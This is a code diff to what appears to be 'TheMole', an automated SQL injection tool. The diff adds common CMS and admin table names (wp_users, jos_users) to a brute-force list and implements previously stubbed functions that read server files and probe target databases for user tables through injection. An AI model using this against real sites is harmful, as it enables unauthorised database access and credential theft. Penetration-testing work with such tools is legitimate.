@@ -47,20 +47,25 @@ class TheMole:
     users_tables = [
         'adm',
         'admin',
+        'admin_users',
         'admins',
         'administrator',
         'administrador',
         'administradores',
         'client',
         'clients',
+        'jos_users',
         'login',
         'logins',
         'user',
+        'user_admin',
         'users',
         'usuario',
         'usuarios',
+        'usuarios_admin',
         'usr',
         'usrs',
+        'wp_users',
     ]
 
     dbms_mole_list = [MysqlMole, SQLServerMole, PostgresMole, OracleMole]
@@ -155,8 +160,10 @@ class TheMole:
                 return
 
             if self._dbms_mole.is_string_query():
+                print('[+] Using string union technique.')
                 self.dumper = StringUnionDataDumper()
             else:
+                print('[+] Using integer union technique.')
                 self.dumper = IntegerUnionDataDumper()
         else:
             self._detect_dbms_blind()
@@ -253,35 +260,19 @@ class TheMole:
         return self.dumper.find_tables_like(self, db, table_filter, self.query_columns, self.injectable_field)
 
     def read_file(self, filename):
-        print("[-] Not implemented yet!")
-        #~ data = self._generic_query_item(
-                    #~ lambda x: self._dbms_mole.read_file_query(filename, self.query_columns, self.injectable_field), 0, lambda x: ''.join(x)
-                #~ )
-        #~ return data
+        return self.dumper.read_file(self, filename, self.query_columns, self.injectable_field)
 
     def brute_force_tables(self, db, table_list):
-        print("[-] Not implemented yet!")
-        #~ for table in table_list:
-            #~ print('[i] Trying table', table)
-            #~ try:
-                #~ exists = False
-                #~ if self.mode == 'union':
-                    #~ req = self.get_requester().request(self.generate_url(self._dbms_mole.fields_count_query(db, table, self.query_columns, self.injectable_field)))
-                    #~ exists = not self._dbms_mole.parse_results(self.analyser.decode(req)) is None
-                #~ else:
-                    #~ req = self.get_requester().request(self.generate_url(
-                                #~ self._dbms_mole.fields_blind_count_query('>', 100000000, db=db, table=table),
-                             #~ ))
-                    #~ if self.analyser.is_valid(req):
-                        #~ exists = True
-                #~ if exists:
-                    #~ print('[+] Table',table,'exists.')
-            #~ except:
-                #~ pass
+        for table in table_list:
+            print('[i] Trying table', table)
+            try:
+                if self.dumper.table_exists(self, db, table, self.query_columns, self.injectable_field):
+                    print('[+] Table',table,'exists.')
+            except:
+                pass
 
     def brute_force_users_tables(self, db):
-        print("[-] Not implemented yet!")
-        #~ self.brute_force_tables(db, TheMole.users_tables)
+        return self.brute_force_tables(db, TheMole.users_tables)
 
     def set_url(self, url):
         if not '?' in url:
